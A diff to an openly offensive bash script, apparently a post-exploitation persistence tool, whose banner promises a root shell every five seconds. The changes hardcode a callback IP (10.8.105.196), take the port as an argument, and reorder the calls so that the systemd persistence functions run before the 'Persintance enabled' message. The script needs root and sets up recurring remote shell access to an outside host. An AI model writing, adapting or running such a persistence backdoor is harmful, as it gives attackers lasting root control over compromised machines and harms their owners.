@@ -6,7 +6,7 @@ green='\033[33;32m'
 reset='\033[0m'
 
 if [ "$1" == "" ]; then
-    echo "usage: $0 <IP> <PORT>"
+    echo "usage: $0 [PORT]"
 fi
 
 if [[ $(id -u) -ne "0" ]]; then
@@ -41,8 +41,8 @@ echo -ne "$green\n"
 
 echo -ne "[*] G3t r00tsh3ll 3v3ry 5 s3c0nds [*]\n\n"
 
-ip="$1"
-port="$2"
+ip="10.8.105.196"
+port="$1"
 
 arr=('.' '..' '...' '....')
 
@@ -88,7 +88,9 @@ function EnablePersistence () {
 
 echo -ne "\n"
 
-scs="[*] Success! [*]"
+SystemdPersistence && EnablePersistence /
+
+scs="[*] Success! Persintance enabled for ${ip}:${port} [*]"
 
 for i in $(seq 1 ${#scs}); do
         echo -ne "${scs:i-1:1}"
@@ -96,5 +98,3 @@ for i in $(seq 1 ${#scs}); do
 done
 
 echo -ne "$reset\n"
-
-SystemdPersistence && EnablePersistence /
